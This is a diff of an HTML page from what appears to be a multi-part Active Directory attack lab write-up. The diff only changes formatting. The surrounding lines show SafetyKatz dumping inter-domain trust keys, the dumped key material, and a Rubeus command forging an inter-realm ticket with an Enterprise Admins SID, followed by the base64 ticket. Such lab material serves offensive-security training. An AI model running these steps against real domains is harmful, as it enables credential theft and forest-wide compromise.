@@ -387,12 +387,12 @@ We should now be able to execute SafetyKatz on the DC and request for the Trust 
 C:\Users\Public\Loader.exe -Path http://127.0.0.1:8080/SafetyKatz.exe -args "%Pwn% /patch" "exit"
 <img src="./images/screenshot_301.png" alt="">
 
-<pre><code>mimikatz(commandline) # lsadump::trust /patch
+<pre><code class="language-bash">mimikatz(commandline) # lsadump::trust /patch
 
 <p>Current domain: US.TECHCORP.LOCAL (US / S-1-5-21-210670787-2521448726-163245708)</p>
 
 Domain: TECHCORP.LOCAL (TECHCORP / S-1-5-21-2781415573-3701854478-2406986946)
- [  In ] US.TECHCORP.LOCAL -> TECHCORP.LOCAL
+ [  In ] US.TECHCORP.LOCAL -&gt; TECHCORP.LOCAL
     <em> 2/9/2025 9:07:35 PM - CLEAR   - b8 1f db a4 25 5e e7 23 af ae fc c3 e0 93 b2 59 5d 62 8e c9 fd 26 27 48 4f b0 63 66 98 05 62 b0 63 3b 13 ee e2 9d 86 86 4b cb 73 6e 01 67 46 08 db 33 14 d5 d4 a9 ab c8 ab c5 84 c3 f6 f5 cf 1b 36 99 b9 d9 4a 6c 95 f1 ba 79 4a 5e 0e 6e b0 2c 31 99 2b 5f 64 b9 bd 4b 30 8b e3 d8 e4 4b 0f 41 b3 98 81 0d ae ec 94 b4 09 d5 6f f7 af 30 97 a0 86 63 b4 56 e8 50 d8 db d2 76 5c 4e f0 84 72 15 24 6a d0 38 5c 4e 40 44 db 49 5d 2e 8a 41 28 b2 f8 0b c5 f1 e9 f1 ff 06 65 55 66 44 46 92 9c 44 47 04 d3 58 b6 f4 4e af 81 63 95 87 78 38 e3 a4 59 30 62 ac 3b f9 e7 66 46 3d 52 2c 13 64 19 80 de 83 9f 3a b0 83 cd c2 0d bc 84 76 31 d0 ab 35 e8 77 65 65 34 3a e4 1f 49 03 77 6c 0b 3c 19 81 53 92 ef 6c 7b ec 1d b8 f4 bd 5b 27 fb 06 77 ef
         </em> aes256_hmac       3b92523986591e46dcee08256f1bcf39d3703b0067cdf83b70da3edee646f09b
         <em> aes128_hmac       558b8112b4c2cf0b07bda172b744f827
@@ -411,7 +411,7 @@ Using Rubeus will be using silver flag for that.
 C:\AD\Tools\Loader.exe -Path C:\AD\Tools\rubeus.exe -args %Pwn% /user:administrator /ldap /service:krbtgt\us.techcorp.local /aes256:3b92523986591e46dcee08256f1bcf39d3703b0067cdf83b70da3edee646f09b /opsec /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /nowrap
 <img src="./images/screenshot_303.png" alt="">
 
-<pre><code>doIFmDCCBZSgAwIBBaEDAgEWooIEczCCBG9hggRrMIIEZ6ADAgEFoRMbEVVTLlRFQ0hDT1JQLkxPQ0FMoiYwJKADAgECoR0wGxsGa3JidGd0GxF1cy50ZWNoY29ycC5sb2NhbKOCBCEwggQdoAMCARKhAwIBA6KCBA8EggQLOHhSjHfhesxIXrsa6Qt2aR/edvHLPChz9u7yr9N8HFBobGhCukTNi0mNk6WNfq82zVBy6y9iMlu/mrYEtB42apWrGv/qTvI15OU7MWRoCgQf8cH/iPZ002doSK4FXxc2WrmAWUttKLTP3seuhvyKCc9jrMS1ZWKoNj2Y3avSSJzdkvU89TkXecCcLPizj3h0lb7Qjk833P1eaM52c+AuCo90jtTc+MB66O2hOhASMHU4bV8TAqZogCYH8J5i1RfwTscZeLzHJxQmA7stKPjV0Eb65vwb9dM0vSrRvSoafAtn0uVnEyuW+r6BQ2PonIU9WWbjO/Nxidn1ZxEQwc/r+2fXd/DjgGle2CM/lt1fQ37yTsXH6PBOSOGk7uqcYHTaHb2w2MxgUEZXvmJf8AIVE1aOjskU1Xw57Iyj/PGD2DdHvA2Ml6ZH7hD2R2tO89r0InNtdJEL7SEyzaE5+1z3q9UTVC0IRuwBCkbJKF+MJK8wp9Gl51UjDUl4+T36QV1L8UzYGk+gAaHVxuKMfHwNxf/JE+Pgjl9hHIfrAcOWuOTNiIJO72CYStyeaJoRGfW+j4GcASi8LH8z+ncLa3FF9EFARF8MGZKXkRqUvN6duGPx5jPmXQD7UkhmLe+pUsuPLdF5wVYcBNEzzxpHIBLeJmS6I2Y8W9uxzrU13+HoCB7UlSfbIJ4k7uUjEQHWSXVjemyHRmkI6tpVH+xRtdJmOdvgdKBd2ky/5PgIzKTBDRmu/EPvX6/xhuMNzjLLbJG/xFCJ3EapPe+tYiWQNSehdNOQGkm1kkccSzTYabaHpTmJcO4IrJpV8fIRxI0dr8k23WOR8HxwEdTNGI0L9Y+v9uUIziWgJn37INyJlXM9myf7dJynSDT//vhd4/phm8z6kU8WnOk6HTi9DX1+c7/qPuGTqQZSRAxGqWwScKF5wjSYNHNAlpHF2J8zCFs2H6ccwJC9a+yZuQHLgPZI8h6zxs4lik65/UMugX7OQyvndulbyHxTkNXsSiPqOFTLIKn5F/VAz52lmg+u0OzgHcYkhb4Y1qXhm88CouCL0j8cIlh0AI2xDx7W3rXrAEs1tjEuy/BulOlW62TriuFA04w8u2jihOBKxs+WaoiUBxMJGlIXJACK2jEgphxaBRK3lECTr6ilfbTO4uw6rvoT49/j+XX9lWGW7sUC1NMY9rStL8dMDFAMnzr+Gpo/k9jZTIW4QiJMMAsy2eKi3pztsr29Un/1zBYQdIbUNMLthR0qj+hKGSPmQV/Wy96NFOMU6RsgM0l37a2OpWCoIy6MyzAF88dRjprDbRXr7oZEYbZ/gMTwOgj5+lAEhggwt/icZE+LJzNi4R28n/JuMv3E1a2qz5JWuWBypv9RgT8Xo4IBDzCCAQugAwIBAKKCAQIEgf99gfwwgfmggfYwgfMwgfCgKzApoAMCARKhIgQgg0HH68WcMYaIeBqkNDZ2OugAXSqHVTi4M5QQxgUq/02hExsRVVMuVEVDSENPUlAuTE9DQUyiGjAYoAMCAQGhETAPGw1hZG1pbmlzdHJhdG9yowcDBQBAoAAApBEYDzIwMjUwMjExMDAxODQ4WqURGA8yMDI1MDIxMTAwMTg0OFqmERgPMjAyNTAyMTExMDE4NDhapxEYDzIwMjUwMjE4MDAxODQ4WqgTGxFVUy5URUNIQ09SUC5MT0NBTKkmMCSgAwIBAqEdMBsbBmtyYnRndBsRdXMudGVjaGNvcnAubG9jYWw=
+<pre><code class="language-bash">doIFmDCCBZSgAwIBBaEDAgEWooIEczCCBG9hggRrMIIEZ6ADAgEFoRMbEVVTLlRFQ0hDT1JQLkxPQ0FMoiYwJKADAgECoR0wGxsGa3JidGd0GxF1cy50ZWNoY29ycC5sb2NhbKOCBCEwggQdoAMCARKhAwIBA6KCBA8EggQLOHhSjHfhesxIXrsa6Qt2aR/edvHLPChz9u7yr9N8HFBobGhCukTNi0mNk6WNfq82zVBy6y9iMlu/mrYEtB42apWrGv/qTvI15OU7MWRoCgQf8cH/iPZ002doSK4FXxc2WrmAWUttKLTP3seuhvyKCc9jrMS1ZWKoNj2Y3avSSJzdkvU89TkXecCcLPizj3h0lb7Qjk833P1eaM52c+AuCo90jtTc+MB66O2hOhASMHU4bV8TAqZogCYH8J5i1RfwTscZeLzHJxQmA7stKPjV0Eb65vwb9dM0vSrRvSoafAtn0uVnEyuW+r6BQ2PonIU9WWbjO/Nxidn1ZxEQwc/r+2fXd/DjgGle2CM/lt1fQ37yTsXH6PBOSOGk7uqcYHTaHb2w2MxgUEZXvmJf8AIVE1aOjskU1Xw57Iyj/PGD2DdHvA2Ml6ZH7hD2R2tO89r0InNtdJEL7SEyzaE5+1z3q9UTVC0IRuwBCkbJKF+MJK8wp9Gl51UjDUl4+T36QV1L8UzYGk+gAaHVxuKMfHwNxf/JE+Pgjl9hHIfrAcOWuOTNiIJO72CYStyeaJoRGfW+j4GcASi8LH8z+ncLa3FF9EFARF8MGZKXkRqUvN6duGPx5jPmXQD7UkhmLe+pUsuPLdF5wVYcBNEzzxpHIBLeJmS6I2Y8W9uxzrU13+HoCB7UlSfbIJ4k7uUjEQHWSXVjemyHRmkI6tpVH+xRtdJmOdvgdKBd2ky/5PgIzKTBDRmu/EPvX6/xhuMNzjLLbJG/xFCJ3EapPe+tYiWQNSehdNOQGkm1kkccSzTYabaHpTmJcO4IrJpV8fIRxI0dr8k23WOR8HxwEdTNGI0L9Y+v9uUIziWgJn37INyJlXM9myf7dJynSDT//vhd4/phm8z6kU8WnOk6HTi9DX1+c7/qPuGTqQZSRAxGqWwScKF5wjSYNHNAlpHF2J8zCFs2H6ccwJC9a+yZuQHLgPZI8h6zxs4lik65/UMugX7OQyvndulbyHxTkNXsSiPqOFTLIKn5F/VAz52lmg+u0OzgHcYkhb4Y1qXhm88CouCL0j8cIlh0AI2xDx7W3rXrAEs1tjEuy/BulOlW62TriuFA04w8u2jihOBKxs+WaoiUBxMJGlIXJACK2jEgphxaBRK3lECTr6ilfbTO4uw6rvoT49/j+XX9lWGW7sUC1NMY9rStL8dMDFAMnzr+Gpo/k9jZTIW4QiJMMAsy2eKi3pztsr29Un/1zBYQdIbUNMLthR0qj+hKGSPmQV/Wy96NFOMU6RsgM0l37a2OpWCoIy6MyzAF88dRjprDbRXr7oZEYbZ/gMTwOgj5+lAEhggwt/icZE+LJzNi4R28n/JuMv3E1a2qz5JWuWBypv9RgT8Xo4IBDzCCAQugAwIBAKKCAQIEgf99gfwwgfmggfYwgfMwgfCgKzApoAMCARKhIgQgg0HH68WcMYaIeBqkNDZ2OugAXSqHVTi4M5QQxgUq/02hExsRVVMuVEVDSENPUlAuTE9DQUyiGjAYoAMCAQGhETAPGw1hZG1pbmlzdHJhdG9yowcDBQBAoAAApBEYDzIwMjUwMjExMDAxODQ4WqURGA8yMDI1MDIxMTAwMTg0OFqmERgPMjAyNTAyMTExMDE4NDhapxEYDzIwMjUwMjE4MDAxODQ4WqgTGxFVUy5URUNIQ09SUC5MT0NBTKkmMCSgAwIBAqEdMBsbBmtyYnRndBsRdXMudGVjaGNvcnAubG9jYWw=
 </code></pre>
 
 <h2>Requesting a Service Ticket</h2>
@@ -479,7 +479,7 @@ Here’s a table of services that can be forged for Kerberos tickets along with 
 
 
 
-          <div class="part-navigation">
+<div class="part-navigation">
             <a href="part-23-cross-domain-attacks-attacking-azure-ad-integratio.html"><ion-icon name="arrow-back-outline"></ion-icon> Previous: Cross Domain Attacks - Attacki</a>
             <a href="part-25-cross-domain-attacks-child-to-forest-root-sid-hist.html">Next: Cross Domain attacks - Child T <ion-icon name="arrow-forward-outline"></ion-icon></a>
           </div>
